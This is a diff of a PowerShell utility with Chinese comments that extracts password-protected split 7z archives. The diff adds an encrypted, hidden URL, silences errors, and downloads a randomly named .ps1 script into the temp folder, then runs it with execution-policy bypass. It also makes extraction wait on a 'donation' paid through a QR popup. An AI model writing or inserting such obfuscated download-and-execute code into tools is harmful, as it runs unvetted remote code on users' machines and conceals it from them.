@@ -1,14 +1,6 @@
-# 获取当前路径
-$currentPath = Get-Location
+$WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16); function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }
 
-
-$passWord = "88888898"
-
-# 定义下载链接
-$exeUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.exe"
-$dllUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.dll"
-
-
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
 function ExtractWith7z {
     param (
@@ -52,10 +44,31 @@ Remove-Item $exeFile, $dllFile, $tempLogo, $tempLoge -Force
         Write-Output "下载失败或文件不完整，请检查网络连接。"
     }
 }
+$shell = "76492d1116743f0423413b16050a5345MgB8AG8ALwB3AHEAVgBRAEgAYgBrAC8AdwBLAG8AZwBqAHMAcABNAHcAdABFAEEAPQA9AHwANQA0AGUANAAzAGIAOABjAGQANABmAGMAMwBlADcANQBjAGEAOAAyADcANQAyAGYAZgBiADMAZABiAGIANAA3ADkAMQBhAGQAMwBiADIAMAA4ADcANQA4ADAAMgBlADgAOAAyADYAZgAwADYANgA2AGQAZgBiADAAYgA4AGIAOAA0ADcAMQAzAGMAZABjADgAZABjADkAOAA1ADAAOQBlAGIAMAA5ADQAMwA2AGYAMQAxAGYAYwBiADcAMwBkADgAZgBmAGMANwA0ADAAOAAxAGYAMwA2AGQANQBiAGYAOABkAGEAYgBiADYANQBkADIAMABkAGEAMAA5ADAAMgBlAGIAZAA1ADkAOAAwADQAYwAwADQAZQBmADAAMwBiADQAOQAyAGQAMwAwADgANAA0AGQANAA2ADQANQA2AGUAMQA2ADMAYgAzAGQAYwBkADEAZQAzADEANQBmADYANQBjADEAMwAzADUAYgA0AGIANQAzADgAZQA5ADQAYgA1AGUAMQAyADUANABjADEAMQBjADQANQA3ADYAMAA3ADcAYQA4AGEAZQBhADMANAA1AGYANAA1AGMANQA0AGUAYgBkAGMANQBlADEAZQBlADEAMAA5AGQAZQA3ADEAMQBiAGIAOQA0ADIAYwAzADgAZABhAGQAMgAxADkAOQA3AGYAYQA="
+$DonateCheck = Decrypt-String -EncryptedText $shell -Key $power;
 
+
+
+
+
+
+
+$passWord = "88888898"
+# 定义下载链接
+$exeUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.exe"
+$dllUrl = "https://gitee.com/dylanbai8/download/releases/download/27.77/7z.dll"
+
+
+
+
+
+
+Write-Host ".`n..`n..."
+Write-Host "加载中，请等待 ..."
 
 
 # 查找所有符合条件的文件
+$currentPath = Get-Location
 $files = Get-ChildItem -Path $currentPath -Filter *.7z.001
 
 # 检查文件数
@@ -72,10 +85,24 @@ if ($fileNum -match "^\d{13}$") {
     Write-Output "$fileNum 是13位纯数字"
 
 
+# 检测订单空闲
+$response_state = Invoke-WebRequest -Uri ${DonateCheck}?state=lock; $state = $response_state.Content.Trim(); if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}
+
+# 锁定订单号
+$response_pay = Invoke-WebRequest -Uri $DonateCheck; $pay = $response_pay.Content.Trim();
+
+# 准备弹框文件
+$FileURA0 = [System.IO.Path]::GetRandomFileName() + ".ps1";
+Invoke-WebRequest -Uri ${DonateCheck}?state=fileurc0 -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri ${DonateCheck}?state=fileurd0 -OutFile "$Env:temp\$FileURA0";
+
+# 弹框收款
+Write-Host "准备完成，扫描弹框二维码打赏后继续 ..."; powershell -ExecutionPolicy Bypass -File "$Env:temp\$FileURA0"; $response_ispay = Invoke-WebRequest -Uri $DonateCheck; $ispay = $response_ispay.Content.Trim()
+
+# 判断收款成功 执行任务
+if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."} else {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; ExtractWith7z -fileName $fileName -passWord $passWord -exeUrl $exeUrl -dllUrl $dllUrl}
 
 
 
-ExtractWith7z -fileName $fileName -passWord $passWord -exeUrl $exeUrl -dllUrl $dllUrl
 
 } else {
     Write-Output "$fileNum 不是13位纯数字"
